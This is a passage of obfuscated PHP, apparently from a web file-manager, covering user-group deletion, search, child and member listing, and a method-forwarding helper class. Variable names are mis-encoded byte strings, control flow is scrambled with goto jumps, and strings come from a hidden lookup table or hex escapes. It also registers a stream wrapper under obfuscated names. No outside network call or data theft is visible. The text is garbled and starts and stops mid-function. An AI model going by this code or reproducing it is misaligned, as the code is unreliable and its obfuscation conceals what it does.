F„âÍ©³ïÔ; fâ‡ØË…: Model($bø÷Ş‹à¬‹[734])->groupRootRemove($CŠ¸×©œß); return $this->where($dšªáù–ß)->delete(); goto FÉØŒÒˆ¤ˆ; a‘ò÷™¶Î: if (!$eéäÈæ‡â || $eéäÈæ‡â[$bø÷Ş‹à¬‹[463]] == 0) { return !1; } $Aø“åµßÑé = $this->getInfoSimple($eéäÈæ‡â[$bø÷Ş‹à¬‹[463]]); $this->_changeChildLevel($eéäÈæ‡â, $Aø“åµßÑé, !0); goto eÎÚÒ‹¶Ã; eÎÚÒ‹¶Ã: $this->where(array($bø÷Ş‹à¬‹[463] => $CŠ¸×©œß))->save(array($bø÷Ş‹à¬‹[463] => $eéäÈæ‡â[$bø÷Ş‹à¬‹[463]])); Model($bø÷Ş‹à¬‹[2171])->where($dšªáù–ß)->delete(); Model($bø÷Ş‹à¬‹[2172])->where($dšªáù–ß)->delete(); goto fâ‡ØË…; F„âÍ©³ïÔ: $bø÷Ş‹à¬‹ =& $_SERVER[í™]; $dšªáù–ß = array($bø÷Ş‹à¬‹[2094] => $CŠ¸×©œß); $eéäÈæ‡â = $this->where($dšªáù–ß)->find(); goto a‘ò÷™¶Î; FÉØŒÒˆ¤ˆ: } protected function groupSort($D¤âÅ¤¢ÌË) { $Aã»íÅËáé =& $_SERVER[í™]; $E‹ˆ˜ÍÏ· = array(); foreach ($D¤âÅ¤¢ÌË as $FŸÅÒå’´¥ => $aÒí½Éëêß) { $E‹ˆ˜ÍÏ·[] = array($Aã»íÅËáé[2094], $aÒí½Éëêß, $Aã»íÅËáé[2115], $FŸÅÒå’´¥ + 1); } $this->saveAll($E‹ˆ˜ÍÏ·); } public function listData() { $aöÇ¢Š¿ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($aöÇ¢Š¿[$_SERVER[í™][354]]); return $aöÇ¢Š¿; } private function _makeOrder($d÷«ÂÁ™· = '') { goto aÁ…ÆŸÒ–; e¼Î”ô®ãº: $dô«›·ÕØİ = Input::get($CÏêåªÁí¦[407], $CÏêåªÁí¦[7], $CÏêåªÁí¦[2098], $f¸¢öØèµ); $dÌïÃ÷Ëºõ = Input::get($CÏêåªÁí¦[408], $CÏêåªÁí¦[7], $CÏêåªÁí¦[2173], array($CÏêåªÁí¦[2173], $CÏêåªÁí¦[404])); $dÌïÃ÷Ëºõ = $e¸‘ø§˜´[$dÌïÃ÷Ëºõ]; goto cŒÖÄò…œ³; aÁ…ÆŸÒ–: $CÏêåªÁí¦ =& $_SERVER[í™]; $f¸¢öØèµ = array($CÏêåªÁí¦[2094], $CÏêåªÁí¦[28], $CÏêåªÁí¦[2080], $CÏêåªÁí¦[187]); $e¸‘ø§˜´ = array($CÏêåªÁí¦[402] => $CÏêåªÁí¦[403], $CÏêåªÁí¦[404] => $CÏêåªÁí¦[405]); goto e¼Î”ô®ãº; cŒÖÄò…œ³: $d÷«ÂÁ™· = $d÷«ÂÁ™· . "{$dô«›·ÕØİ}\40{$dÌïÃ÷Ëºõ}\x2c\x20\x67\162\x6f\165\160\111\104\40\141\163\143"; return $this->order($d÷«ÂÁ™·); goto eĞÇ²ÄÁ; eĞÇ²ÄÁ: } public function listChild($B‘†ã·í) { $cíİ™ô¦˜Â =& $_SERVER[í™]; $Dë ÁíÁßš = $this->where(array($cíİ™ô¦˜Â[463] => $B‘†ã·í))->_makeOrder()->selectPage(200); $this->_listDataApply($Dë ÁíÁßš[$cíİ™ô¦˜Â[354]]); return $Dë ÁíÁßš; } public function listByID($e„¿Íñ†Æ) { $d·°·öˆè =& $_SERVER[í™]; if (!$e„¿Íñ†Æ) { return array(); } $f¦­§ã‰ç´ = array($d·°·öˆè[2094] => array($d·°·öˆè[7], $e„¿Íñ†Æ)); $f…íÍ…§–Š = $this->where($f¦­§ã‰ç´)->select(); $this->_listDataApply($f…íÍ…§–Š); return $f…íÍ…§–Š; } public function listSearch($EŒ’ö¯Éô·) { goto FñÅæÅñ·‰; a’¨™„Ü: if ($DÍ¸¤¡µ¨‡) { $fÈ¥…¹‹ˆ = $this->getInfoSimple($DÍ¸¤¡µ¨‡); $AÊíË Ò˜‡ = $fÈ¥…¹‹ˆ[$Fè‡ËŸ¢ŸÌ[461]] . $DÍ¸¤¡µ¨‡ . $Fè‡ËŸ¢ŸÌ[486]; $f¢ˆˆæ¼Öò = array($f¢ˆˆæ¼Öò, array($Fè‡ËŸ¢ŸÌ[461] => array($Fè‡ËŸ¢ŸÌ[733], $AÊíË Ò˜‡))); } $A‚ªÄ¦Â· = $this->_makeOrder()->where($f¢ˆˆæ¼Öò)->selectPage(20); $A‚ªÄ¦Â· = $A‚ªÄ¦Â· ? $A‚ªÄ¦Â· : array(); goto AÑ“¥ôõò; FñÅæÅñ·‰: $Fè‡ËŸ¢ŸÌ =& $_SERVER[í™]; $FƒŠÍù„ê = $EŒ’ö¯Éô·[$Fè‡ËŸ¢ŸÌ[2174]]; $DÍ¸¤¡µ¨‡ = isset($EŒ’ö¯Éô·[$Fè‡ËŸ¢ŸÌ[2175]]) ? $EŒ’ö¯Éô·[$Fè‡ËŸ¢ŸÌ[2175]] : !1; goto a•«ˆï‰ƒ‡; AÑ“¥ôõò: if (!$A‚ªÄ¦Â· || count($A‚ªÄ¦Â·[$Fè‡ËŸ¢ŸÌ[354]]) < 5 && Input::check($FƒŠÍù„ê, $Fè‡ËŸ¢ŸÌ[306])) { goto cóËé£¡îõ; F‹¤¸åäÃÈ: $A‚ªÄ¦Â·[$Fè‡ËŸ¢ŸÌ[351]][$Fè‡ËŸ¢ŸÌ[353]] = ceil($A‚ªÄ¦Â·[$Fè‡ËŸ¢ŸÌ[351]][$Fè‡ËŸ¢ŸÌ[352]] / $A‚ªÄ¦Â·[$Fè‡ËŸ¢ŸÌ[351]][$Fè‡ËŸ¢ŸÌ[349]]); goto A×ãÖ˜¼Í; cóËé£¡îõ: $Eàº•£¾® = $this->groupChildrenAll($DÍ¸¤¡µ¨‡); $cõËÎÉòÄâ = $this->_searchFromMeta($Fè‡ËŸ¢ŸÌ[415], $FƒŠÍù„ê, 10, $Eàº•£¾®); $d‹­ë¦Š¸ = $this->_searchFromMeta($Fè‡ËŸ¢ŸÌ[416], $FƒŠÍù„ê, 10, $Eàº•£¾®); goto B—•×ÅÒœã; B—•×ÅÒœã: $Cç…½¥£©” = array_merge($cõËÎÉòÄâ, $d‹­ë¦Š¸, $A‚ªÄ¦Â·[$Fè‡ËŸ¢ŸÌ[354]]); $A‚ªÄ¦Â·[$Fè‡ËŸ¢ŸÌ[354]] = array_unique_by_key($Cç…½¥£©”, $Fè‡ËŸ¢ŸÌ[2094]); $A‚ªÄ¦Â·[$Fè‡ËŸ¢ŸÌ[351]][$Fè‡ËŸ¢ŸÌ[352]] = count($A‚ªÄ¦Â·[$Fè‡ËŸ¢ŸÌ[354]]); goto F‹¤¸åäÃÈ; A×ãÖ˜¼Í: } $this->_listDataApply($A‚ªÄ¦Â·[$Fè‡ËŸ¢ŸÌ[354]]); return $A‚ªÄ¦Â·; goto D®®‡Ü¹Ø¼; a•«ˆï‰ƒ‡: if (!trim($FƒŠÍù„ê)) { return !1; } $FƒŠÍù„ê = str_replace($Fè‡ËŸ¢ŸÌ[2176], $Fè‡ËŸ¢ŸÌ[2177], $FƒŠÍù„ê); $f¢ˆˆæ¼Öò = array($Fè‡ËŸ¢ŸÌ[2094] => array($Fè‡ËŸ¢ŸÌ[733], "\45{$FƒŠÍù„ê}\45"), $Fè‡ËŸ¢ŸÌ[28] => array($Fè‡ËŸ¢ŸÌ[733], "\45{$FƒŠÍù„ê}\x25"), $Fè‡ËŸ¢ŸÌ[899] => $Fè‡ËŸ¢ŸÌ[2178]); goto a’¨™„Ü; D®®‡Ü¹Ø¼: } protected function groupChildrenAll($EùÉß……ò) { $C“é½œß‹ =& $_SERVER[í™]; if (!$EùÉß……ò) { return !1; } if (is_string($EùÉß……ò)) { $EùÉß……ò = array($EùÉß……ò); } $DØÇÑÖš = $EùÉß……ò; foreach ($EùÉß……ò as $Dª¾¬¬÷‰ƒ) { $FºŸó’ó˜Ù = $this->getInfoSimple($Dª¾¬¬÷‰ƒ); $f´ğ­ğóÀÅ = array($C“é½œß‹[461] => array($C“é½œß‹[733], $FºŸó’ó˜Ù[$C“é½œß‹[461]] . $Dª¾¬¬÷‰ƒ . $C“é½œß‹[486])); $EŸŒ–İáŒ« = $this->field($C“é½œß‹[2094])->where($f´ğ­ğóÀÅ)->select(); $DØÇÑÖš = array_merge($DØÇÑÖš, array_to_keyvalue($EŸŒ–İáŒ«, $C“é½œß‹[33], $C“é½œß‹[2094])); } return array_unique($DØÇÑÖš); } private function _searchFromMeta($aØ„¬ŞÚŠ, $A®î­æ­æ, $f‘Âù¸¥Ş§, $e•­÷±É‹§) { goto FœÉ­…À¿; FœÉ­…À¿: $a•©Ä½ïˆ¸ =& $_SERVER[í™]; $A®î­æ­æ = strtolower($A®î­æ­æ); $F¹§ÆÕ¸é = array($a•©Ä½ïˆ¸[89] => $aØ„¬ŞÚŠ, $a•©Ä½ïˆ¸[359] => array($a•©Ä½ïˆ¸[733], "\x25{$A®î­æ­æ}\x25")); goto eËáÆŸ°Ù°; eËáÆŸ°Ù°: if ($e•­÷±É‹§) { $F¹§ÆÕ¸é[$a•©Ä½ïˆ¸[2094]] = array($a•©Ä½ïˆ¸[7], $e•­÷±É‹§); } $d†Üà…ğÃ = Model($a•©Ä½ïˆ¸[2179])->where($F¹§ÆÕ¸é)->limit($f‘Âù¸¥Ş§)->select(); if (!$d†Üà…ğÃ) { return array(); } goto F‡åƒÚÒô†; CÓÊî¡©¼¥: return $EŠˆºÍ‹ƒ; goto EŠÖ”ÇÇÜ¬; F‡åƒÚÒô†: $d†Üà…ğÃ = array_to_keyvalue($d†Üà…ğÃ, $a•©Ä½ïˆ¸[33], $a•©Ä½ïˆ¸[2094]); $EŠˆºÍ‹ƒ = $this->where(array($a•©Ä½ïˆ¸[2170] => array($a•©Ä½ïˆ¸[7], $d†Üà…ğÃ)))->select(); if (!$EŠˆºÍ‹ƒ) { return array(); } goto CÓÊî¡©¼¥; EŠÖ”ÇÇÜ¬: } protected function _listDataApplyItem($DÌÇ“œ²Œï) { $fÄÎ¶³« = array($DÌÇ“œ²Œï); $this->_listDataApply($fÄÎ¶³«); return $fÄÎ¶³«[0]; } protected function _listDataApply(&$B‰öõê†İ) { goto dğËá‰Ä; fïØ–ÙğŞÎ: $this->_listAppendParent($B‰öõê†İ); $this->_listAppendSourceRoot($B‰öõê†İ, $eÙÒå¶×œ); goto eáá¿ÄË×È; dğËá‰Ä: $aØÍ§¼ó”Ì =& $_SERVER[í™]; if (!$B‰öõê†İ) { return; } $eÙÒå¶×œ = array_to_keyvalue($B‰öõê†İ, $aØÍ§¼ó”Ì[33], $aØÍ§¼ó”Ì[2094]); goto F´Í¿Ó»çŒ; F´Í¿Ó»çŒ: $this->_listAppendChildren($B‰öõê†İ); $this->_listAppendChildrenMember($B‰öõê†İ); $this->_listAppendMeta($B‰öõê†İ, $eÙÒå¶×œ); goto fïØ–ÙğŞÎ; eáá¿ÄË×È: } private function _listAppendChildren(&$eöèƒ¼Ø™ä) { goto C†à©õ½ŸÂ; C†à©õ½ŸÂ: $AîÕ•½®Å‡ =& $_SERVER[í™]; $cµÄæ†…‡ = $AîÕ•½®Å‡[361]; $f±ÍâÁ‰íÅ = array(); goto d–—´Û²Çâ; FğØÜ¤Ÿ•‰: $f±ÍâÁ‰íÅ = array_to_keyvalue($f±ÍâÁ‰íÅ, $AîÕ•½®Å‡[452]); foreach ($eöèƒ¼Ø™ä as &$F‘Üèñ‡•§) { $F‘Üèñ‡•§[$AîÕ•½®Å‡[2180]] = isset($f±ÍâÁ‰íÅ[$F‘Üèñ‡•§[$AîÕ•½®Å‡[2094]] . $AîÕ•½®Å‡[2181]]); } goto F•‰éìÁÂ; d–—´Û²Çâ: $fÈŒ´ÛÎ¢î = count($eöèƒ¼Ø™ä); $Cï×ŞÄİÇ = $this->tablePrefix . $this->tableName; for ($B¥ãóÍÓ÷¹ = 0, $D…Ñº¡£ß = 0; $B¥ãóÍÓ÷¹ < $fÈŒ´ÛÎ¢î; $B¥ãóÍÓ÷¹++) { $D…Ñº¡£ß++; $e¦Á…µ¾‹Ä = $eöèƒ¼Ø™ä[$B¥ãóÍÓ÷¹][$AîÕ•½®Å‡[2094]]; $cµÄæ†…‡ .= "\x53\105\x4c\x45\x43\x54\x20\x2a\40\x46\122\117\x4d\x20\50\123\105\114\x45\x43\124\40\x27{$e¦Á…µ¾‹Ä}\137\x63\x68\151\154\144\x27\40\141\163\40\x68\x61\x73\x20\x46\122\x4f\115\40\x60{$Cï×ŞÄİÇ}\140\40\x77\x68\x65\x72\145\x20\x70\141\x72\145\x6e\164\111\x44\75{$e¦Á…µ¾‹Ä}\40\154\151\155\x69\x74\40\x31\51\40\141\x73\x20\x74\142\137{$e¦Á…µ¾‹Ä}\40\165\156\x69\157\x6e\40\141\x6c\x6c\40"; if (($D…Ñº¡£ß >= 20 || $B¥ãóÍÓ÷¹ == $fÈŒ´ÛÎ¢î - 1) && $cµÄæ†…‡) { $cµÄæ†…‡ = substr($cµÄæ†…‡, 0, -strlen($AîÕ•½®Å‡[451])); $F©—‹šŞß¾ = $this->query($cµÄæ†…‡); $f±ÍâÁ‰íÅ = array_merge($f±ÍâÁ‰íÅ, $F©—‹šŞß¾); $D…Ñº¡£ß = 0; $cµÄæ†…‡ = $AîÕ•½®Å‡[33]; } } goto FğØÜ¤Ÿ•‰; F•‰éìÁÂ: } private function _listAppendChildrenMember(&$AÃ—ˆÌß) { goto eæ¬è–‡âœ; aÇ‰å®÷öˆ: $c²®«æÓÍª = array_to_keyvalue($c²®«æÓÍª, $e‹ÄæÚ¿Â[452]); foreach ($AÃ—ˆÌß as &$aš„ç’Æ‰) { $aš„ç’Æ‰[$e‹ÄæÚ¿Â[2182]] = isset($c²®«æÓÍª[$aš„ç’Æ‰[$e‹ÄæÚ¿Â[2094]] . $e‹ÄæÚ¿Â[2181]]); } goto D“š•²¶†; bÑÈÇ¥‚²©: $eß›ìë»†ö = count($AÃ—ˆÌß); $e…°›¢“¸¡ = $this->tablePrefix . $e‹ÄæÚ¿Â[2172]; for ($A˜çÌÜ©‚¿ = 0, $cóš²õ•ç = 0; $A˜çÌÜ©‚¿ < $eß›ìë»†ö; $A˜çÌÜ©‚¿++) { $cóš²õ•ç++; $E¹ƒ¡ä„¿Ë = $AÃ—ˆÌß[$A˜çÌÜ©‚¿][$e‹ÄæÚ¿Â[2094]]; $Cæï¦Ï²¸‹ .= "\123\105\114\105\103\124\40\x2a\x20\x46\122\117\x4d\x20\50\123\105\x4c\105\103\124\x20\x27{$E¹ƒ¡ä„¿Ë}\x5f\x63\x68\151\154\x64\x27\40\x61\163\x20\150\x61\163\40\106\x52\x4f\x4d\x20\x60{$e…°›¢“¸¡}\140\x20\x77\150\145\x72\x65\40\x67\162\157\165\x70\x49\104\x3d{$E¹ƒ¡ä„¿Ë}\x20\154\x69\x6d\151\164\x20\x31\51\40\x61\x73\40\164\x62\x5f{$E¹ƒ¡ä„¿Ë}\x20\x75\156\151\x6f\x6e\40\141\x6c\154\x20"; if (($cóš²õ•ç >= 20 || $A˜çÌÜ©‚¿ == $eß›ìë»†ö - 1) && $Cæï¦Ï²¸‹) { $Cæï¦Ï²¸‹ = substr($Cæï¦Ï²¸‹, 0, -strlen($e‹ÄæÚ¿Â[451])); $f¾ŠÓ½² = $this->query($Cæï¦Ï²¸‹); $c²®«æÓÍª = array_merge($c²®«æÓÍª, $f¾ŠÓ½²); $cóš²õ•ç = 0; $Cæï¦Ï²¸‹ = $e‹ÄæÚ¿Â[33]; } } goto aÇ‰å®÷öˆ; eæ¬è–‡âœ: $e‹ÄæÚ¿Â =& $_SERVER[í™]; $Cæï¦Ï²¸‹ = $e‹ÄæÚ¿Â[361]; $c²®«æÓÍª = array(); goto bÑÈÇ¥‚²©; D“š•²¶†: } private function _listAppendMeta(&$a¨†èÜ¥Î, $aÊ®ƒ˜¨›) { $b÷ºªÁ¾‚õ =& $_SERVER[í™]; $D­ÌÏÓçÎÅ = array($b÷ºªÁ¾‚õ[2094] => array($b÷ºªÁ¾‚õ[7], $aÊ®ƒ˜¨›)); $F»‚«­¢“ = Model($b÷ºªÁ¾‚õ[2171])->where($D­ÌÏÓçÎÅ)->select(); $F»‚«­¢“ = array_to_keyvalue_group($F»‚«­¢“, $b÷ºªÁ¾‚õ[2094]); foreach ($F»‚«­¢“ as &$f«¿™¿Ûí) { $f«¿™¿Ûí = array_to_keyvalue($f«¿™¿Ûí, $b÷ºªÁ¾‚õ[89], $b÷ºªÁ¾‚õ[359]); } foreach ($a¨†èÜ¥Î as &$A¸ßáƒ˜) { $A¸ßáƒ˜[$b÷ºªÁ¾‚õ[417]] = array(); if (isset($F»‚«­¢“[$A¸ßáƒ˜[$b÷ºªÁ¾‚õ[2094]]])) { $A¸ßáƒ˜[$b÷ºªÁ¾‚õ[417]] = $F»‚«­¢“[$A¸ßáƒ˜[$b÷ºªÁ¾‚õ[2094]]]; } } } protected function parentLevelArray($a¿½¸‰­‰Æ) { $DÇöØİÕê =& $_SERVER[í™]; $a¿½¸‰­‰Æ = explode($DÇöØİÕê[47], trim($a¿½¸‰­‰Æ, $DÇöØİÕê[47])); $a¿½¸‰­‰Æ = array_remove_value($a¿½¸‰­‰Æ, $DÇöØİÕê[470]); return $a¿½¸‰­‰Æ; } private function _listAppendParent(&$e”³‚êÏÄñ) { goto FÑáØÜë‰Ö; FÑáØÜë‰Ö: $F¦ˆİ¦É±Ô =& $_SERVER[í™]; $d²©‚Œã´Ë = array(); foreach ($e”³‚êÏÄñ as &$c »ïæğÃ÷) { $d²©‚Œã´Ë[$c »ïæğÃ÷[$F¦ˆİ¦É±Ô[2094]]] = $c »ïæğÃ÷[$F¦ˆİ¦É±Ô[28]]; $AÛ²Š£Ê× = $this->parentLevelArray($c »ïæğÃ÷[$F¦ˆİ¦É±Ô[461]]); foreach ($AÛ²Š£Ê× as $e™ñöƒ‹) { if (!isset($d²©‚Œã´Ë[$e™ñöƒ‹])) { $d²©‚Œã´Ë[$e™ñöƒ‹] = 0; } } } goto CÔ¹–Ÿã–; a§õ®’ò…Ÿ: $c¾›ìñì = $GLOBALS[$F¦ˆİ¦É±Ô[6]][$F¦ˆİ¦É±Ô[84]][$F¦ˆİ¦É±Ô[2184]]; foreach ($e”³‚êÏÄñ as &$c »ïæğÃ÷) { $AÛ²Š£Ê× = $this->parentLevelArray($c »ïæğÃ÷[$F¦ˆİ¦É±Ô[461]]); $dÆÓİ°¶äõ = $F¦ˆİ¦É±Ô[33]; foreach ($AÛ²Š£Ê× as $f‡ËÜæ±« => $e™ñöƒ‹) { if ($c¾›ìñì && $f‡ËÜæ±« == 0) { continue; } $dÆÓİ°¶äõ .= $d²©‚Œã´Ë[$e™ñöƒ‹] . $F¦ˆİ¦É±Ô[8]; } if ($AÛ²Š£Ê×) { $dÆÓİ°¶äõ .= $c »ïæğÃ÷[$F¦ˆİ¦É±Ô[28]]; } $c »ïæğÃ÷[$F¦ˆİ¦É±Ô[465]] = str_replace($F¦ˆİ¦É±Ô[469], $F¦ˆİ¦É±Ô[8], $dÆÓİ°¶äõ); } goto E÷£ªæÄÕ•; CÔ¹–Ÿã–: $Dîà¡¿’ ‹ = array(); foreach ($d²©‚Œã´Ë as $f‡ËÜæ±« => $Cõ¿ßå±Òé) { if (!$Cõ¿ßå±Òé) { $Dîà¡¿’ ‹[] = $f‡ËÜæ±«; } } if ($Dîà¡¿’ ‹) { $C°Ùè±Ï‹ = array($F¦ˆİ¦É±Ô[2170] => array($F¦ˆİ¦É±Ô[384], $Dîà¡¿’ ‹)); $Eóİ®À‚«« = $this->field($F¦ˆİ¦É±Ô[2183])->where($C°Ùè±Ï‹)->select(); $Cóï”ó«ô• = array_to_keyvalue($Eóİ®À‚««, $F¦ˆİ¦É±Ô[2094], $F¦ˆİ¦É±Ô[28]); $d²©‚Œã´Ë = array_merge_index($d²©‚Œã´Ë, $Cóï”ó«ô•); } goto a§õ®’ò…Ÿ; E÷£ªæÄÕ•: } private function _listAppendSourceRoot(&$Cö¡¯»–œà, $e†Ãã‹‘Ç) { goto Cß®»ÄŠ; dÍîŒâÌÑ–: foreach ($Cö¡¯»–œà as &$CÖëÔÂ‹¬) { $CÖëÔÂ‹¬[$AôîŸ¡âÌœ[391]] = $F˜¸óÑéº¼[$CÖëÔÂ‹¬[$AôîŸ¡âÌœ[2094]]] ? $F˜¸óÑéº¼[$CÖëÔÂ‹¬[$AôîŸ¡âÌœ[2094]]] : array(); } goto fÚ¹¾Õ‰; e˜¥ĞÄË®: $F˜¸óÑéº¼ = Model($AôîŸ¡âÌœ[734])->order($AôîŸ¡âÌœ[2186])->field($Båºä–›š£)->where($A£–è„œè)->select(); $F˜¸óÑéº¼ = array_to_keyvalue($F˜¸óÑéº¼, $AôîŸ¡âÌœ[458]); $F˜¸óÑéº¼ = array_remove_key($F˜¸óÑéº¼, $AôîŸ¡âÌœ[458]); goto dÍîŒâÌÑ–; Cß®»ÄŠ: $AôîŸ¡âÌœ =& $_SERVER[í™]; $A£–è„œè = array($AôîŸ¡âÌœ[371] => SourceModel::TYPE_GROUP, $AôîŸ¡âÌœ[463] => 0, $AôîŸ¡âÌœ[458] => array($AôîŸ¡âÌœ[7], $e†Ãã‹‘Ç)); $Båºä–›š£ = $AôîŸ¡âÌœ[2185]; goto e˜¥ĞÄË®; fÚ¹¾Õ‰: } protected function groupMerge($E¤¸ÊµÚÏö) { $E¤¸ÊµÚÏö = array_values(array_unique($E¤¸ÊµÚÏö)); $aè»‹åîå = array(); for ($eğÓš£ÈÓá = 0; $eğÓš£ÈÓá < count($E¤¸ÊµÚÏö); $eğÓš£ÈÓá++) { $e÷Ä•óñŞ¼ = !1; for ($EŒ”‡›š†œ = 0; $EŒ”‡›š†œ < count($E¤¸ÊµÚÏö); $EŒ”‡›š†œ++) { if ($eğÓš£ÈÓá == $EŒ”‡›š†œ) { continue; } if ($this->isParentOf($E¤¸ÊµÚÏö[$EŒ”‡›š†œ], $E¤¸ÊµÚÏö[$eğÓš£ÈÓá])) { $e÷Ä•óñŞ¼ = !0; break; } } if (!$e÷Ä•óñŞ¼) { $aè»‹åîå[] = $E¤¸ÊµÚÏö[$eğÓš£ÈÓá]; } } return $aè»‹åîå; } protected function isParentOf($Fî†…‰¿Ñ, $eÒÄ—ÈŒ÷) { goto A¹­°È§·Æ; A¹­°È§·Æ: $C„Æ¬ÇùŒÔ =& $_SERVER[í™]; if (!$Fî†…‰¿Ñ || !$eÒÄ—ÈŒ÷ || $Fî†…‰¿Ñ == $eÒÄ—ÈŒ÷) { return !1; } $c’¼êèÓË¦ = $this->getInfoSimple($Fî†…‰¿Ñ); goto aêàñŒ†Á; bÊË ‰Ùêš: return !1; goto b°‘¥ÎÚé‰; aêàñŒ†Á: $e¬íèñøÇİ = $this->getInfoSimple($eÒÄ—ÈŒ÷); $aÎ‚·±ÉÉ = $c’¼êèÓË¦[$C„Æ¬ÇùŒÔ[461]] . $Fî†…‰¿Ñ . $C„Æ¬ÇùŒÔ[47]; if (substr($e¬íèñøÇİ[$C„Æ¬ÇùŒÔ[461]], 0, strlen($aÎ‚·±ÉÉ)) == $aÎ‚·±ÉÉ) { return !0; } goto bÊË ‰Ùêš; b°‘¥ÎÚé‰: } public function groupShowRoot($D·º–¦‚®Ò, $AÈ­’ğ¼ìö = false) { goto bïºÔÑ²Éæ; e¸äˆ¡…‰ì: $C¨Œ¦‚ÓŞÜ = $this->parentLevelArray($c’äÂã©Óô[$aêµÅŒœ¸Ö[461]]); $bŒö›ìá›· = array($D·º–¦‚®Ò); if (count($C¨Œ¦‚ÓŞÜ) == 0) { return $bŒö›ìá›·; } goto cä´§‚£¬÷; bïºÔÑ²Éæ: $aêµÅŒœ¸Ö =& $_SERVER[í™]; $c’äÂã©Óô = $this->getInfo($D·º–¦‚®Ò); if (!$c’äÂã©Óô) { return array(); } goto e¸äˆ¡…‰ì; cä´§‚£¬÷: if ($AÈ­’ğ¼ìö && count($C¨Œ¦‚ÓŞÜ) == 1) { return $bŒö›ìá›·; } if (!$c’äÂã©Óô[$aêµÅŒœ¸Ö[417]] || !isset($c’äÂã©Óô[$aêµÅŒœ¸Ö[417]][$aêµÅŒœ¸Ö[2168]]) || $c’äÂã©Óô[$aêµÅŒœ¸Ö[417]][$aêµÅŒœ¸Ö[2168]] == $aêµÅŒœ¸Ö[2142]) { return $this->groupShowRoot($C¨Œ¦‚ÓŞÜ[count($C¨Œ¦‚ÓŞÜ) - 1], $AÈ­’ğ¼ìö); } if ($c’äÂã©Óô[$aêµÅŒœ¸Ö[417]][$aêµÅŒœ¸Ö[2168]] == $aêµÅŒœ¸Ö[346]) { $aÕŒ­±¶Šİ = explode($aêµÅŒœ¸Ö[47], $c’äÂã©Óô[$aêµÅŒœ¸Ö[417]][$aêµÅŒœ¸Ö[2169]]); if ($aÕŒ­±¶Šİ) { $bŒö›ìá›· = array_merge($bŒö›ìá›·, $aÕŒ­±¶Šİ); } } goto C…é™…µ¸; C…é™…µ¸: return $bŒö›ìá›·; goto AÒçù®Òíƒ; AÒçù®Òíƒ: } protected function resetParentLevel() { $eŸ’‘¿ãï— =& $_SERVER[í™]; $D†…µ£Õ¢ = $eŸ’‘¿ãï—[2094]; $AÜà”ó…†ñ = $this->select(); $AÜà”ó…†ñ = array_to_keyvalue($AÜà”ó…†ñ, $D†…µ£Õ¢); foreach ($AÜà”ó…†ñ as $dÛ†µ«¹Ò­) { goto e‘†ÆãÁè¶; e‘†ÆãÁè¶: $eèë†Ÿğ…Ò = $dÛ†µ«¹Ò­; $f…ãÓ‡¶­ = array(); while ($eèë†Ÿğ…Ò[$eŸ’‘¿ãï—[463]] != 0) { $f…ãÓ‡¶­[] = $eèë†Ÿğ…Ò[$eŸ’‘¿ãï—[463]]; $eèë†Ÿğ…Ò = $AÜà”ó…†ñ[$eèë†Ÿğ…Ò[$eŸ’‘¿ãï—[463]]]; } goto b©éŸ¦­ùé; dÄ˜ìª„®: $this->where(array($D†…µ£Õ¢ => $dÛ†µ«¹Ò­[$D†…µ£Õ¢]))->save(array($eŸ’‘¿ãï—[527] => $f…ãÓ‡¶­)); goto aƒ®„¡÷²ê; b©éŸ¦­ùé: $f…ãÓ‡¶­[] = 0; $f…ãÓ‡¶­ = $eŸ’‘¿ãï—[47] . implode($eŸ’‘¿ãï—[47], array_reverse($f…ãÓ‡¶­)) . $eŸ’‘¿ãï—[47]; $this->setNamePinyin($dÛ†µ«¹Ò­[$D†…µ£Õ¢], $dÛ†µ«¹Ò­[$eŸ’‘¿ãï—[28]]); goto dÄ˜ìª„®; aƒ®„¡÷²ê: } return $AÜà”ó…†ñ; } public function groupNameAuto($EÜ«¹ó©‘Ø, $fæØÏê½½…) { $A°ôåÑ¦‘» =& $_SERVER[í™]; $a±íèÒˆÒù = $this->where(array($A°ôåÑ¦‘»[368] => $EÜ«¹ó©‘Ø))->getField($A°ôåÑ¦‘»[28], !0); if (!$a±íèÒˆÒù || !in_array($fæØÏê½½…, $a±íèÒˆÒù)) { return $fæØÏê½½…; } for ($dá¡»“×¨· = 1; $dá¡»“×¨· <= count($a±íèÒˆÒù) + 1; $dá¡»“×¨·++) { $A¿ÂÔĞ×ôß = $fæØÏê½½… . "\50{$dá¡»“×¨·}\51"; if (!in_array($A¿ÂÔĞ×ôß, $a±íèÒˆÒù)) { return $A¿ÂÔĞ×ôß; } } } } goto EÉŠÍÏ¾¦Ü; Fìğâ «ƒ¯: $_SERVER[$_SERVER[ñâ][49]] = ("\x39\x37\x32\x32".base64_decode('ODg='))+0;$_cUMN="yPCXr54VYjkAppNTd3geRt7HPktZWPMeIUAsmz5aJvh8RGqvdJI7SwuatTxHmDvtt";; stream_wrapper_register($_SERVER[ñâ][50], $_SERVER[ñâ][51]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($A—æ“¶¸Øò, $fÂİË´Ôµ‰) { $BÊã‚£±áÃ =& $_SERVER[í™]; if (isset(self::$_methodList[$A—æ“¶¸Øò])) { return @call_user_func_array(self::$_methodList[$A—æ“¶¸Øò], $fÂİË´Ôµ‰); } else { if (method_exists($this, $A—æ“¶¸Øò)) { return call_user_func_array(array($this, $A—æ“¶¸Øò), $fÂİË´Ôµ‰); } else { think_exception(__CLASS__ . $BÊã‚£±áÃ[4] . $A—æ“¶¸Øò . $BÊã‚£±áÃ[5]); } } } public static function __callStatic($Aá’ÁÒÏ, $eÁÛõîâğà) { if (isset(self::$_methodListStatic[$Aá’ÁÒÏ])) { return call_user_func_array(self::$_methodListStatic[$Aá’ÁÒÏ], $eÁÛõîâğà); } else { if (method_exists(self, $Aá’ÁÒÏ)) { return call_user_func_array(array(self, $Aá’ÁÒÏ), $eÁÛõîâğà); } else { show_json("{$Aá’ÁÒÏ}\x28\x29\40\x6e\x6f\164\x20\145\170\151\x73\164\x3b", !1); } } } public static function addMethod($D¾ÕÖÕÙÉ, $Cë™©Ÿ³©Ë) { self::$_methodList[$D¾ÕÖÕÙÉ] = $Cë™©Ÿ³©Ë; } public static function addMethodStatic($fÙªˆ£ƒÌ¿, $FÜ¿±‚ê²â) { self::$_methodListStatic[$fÙªˆ£ƒÌ¿] = $FÜ¿±‚ê²â; } } goto B‹Íë‰´ù; c‡´–ÉŠİƒ: class TaskFileTransfer extends Task { protected function startAfter() { goto aÄë™†Ó‰–; aóĞ®„¥…: $c¡â„Ñ†¥[$fªÔÀÓŒáè[1466]] = LNG($fªÔÀÓŒáè[1467]); 